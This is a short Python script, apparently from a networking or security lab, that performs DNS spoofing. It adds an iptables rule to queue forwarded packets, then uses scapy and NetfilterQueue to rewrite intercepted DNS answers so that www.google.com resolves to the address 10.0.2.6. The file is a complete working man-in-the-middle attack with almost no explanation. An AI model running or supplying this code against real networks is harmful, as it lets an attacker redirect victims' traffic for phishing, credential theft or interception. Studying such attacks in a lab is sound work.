#import netfilterqueue
from scapy.all import *
import os
from netfilterqueue import NetfilterQueue

def modify(packet):

    dnsPacket = IP(packet.get_payload())

    print("og packet")
    dnsPacket.show()
    if dnsPacket[DNS].qr == 1:

        #creating new packet to be sent
        modifiedPacket = IP() / UDP() / DNS()
        modifiedPacket[IP].src = dnsPacket[IP].src
        modifiedPacket[IP].dst = dnsPacket[IP].dst
        modifiedPacket[UDP].sport = dnsPacket[UDP].sport
        modifiedPacket[UDP].dport = dnsPacket[UDP].dport

        modifiedPacket[DNS].id = dnsPacket[DNS].id
        modifiedPacket[DNS].op = 0
        modifiedPacket[DNS].rcode = 0 
        modifiedPacket[DNS].ra = 1
        modifiedPacket[DNS].rd = 1
        modifiedPacket[DNS].qd = dnsPacket[DNS].qd
        modifiedPacket[DNS].aa = 1
        modifiedPacket[DNS].rd = dnsPacket[DNS].rd
        modifiedPacket[DNS].ra = dnsPacket[DNS].ra
        modifiedPacket[DNS].ancount = 1
        modifiedPacket[DNS].qdcount = 1
        modifiedPacket[DNS].arcount = 0
        modifiedPacket[DNS].nscount = 0
        modifiedPacket[DNS].ns = None
        modifiedPacket[DNS].ar = None


        modifiedPacket[DNS].an = DNSRR(rrname = "www.google.com", type=dnsPacket[DNS].an.type, rdata='10.0.2.6', rclass=dnsPacket[DNS].an.rclass, rdlen=dnsPacket[DNS].an.rdlen, ttl=100)

        #calculate the checksum
        print("new packet")
        modifiedPacket.show2()

        packet.set_payload(bytes(modifiedPacket))
    else: 
        packet.accept()
    
    packet.accept()

    

def dns_spoof():
    
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num  1")
    queue = NetfilterQueue()
    queue.bind(1, modify)
    queue.run()



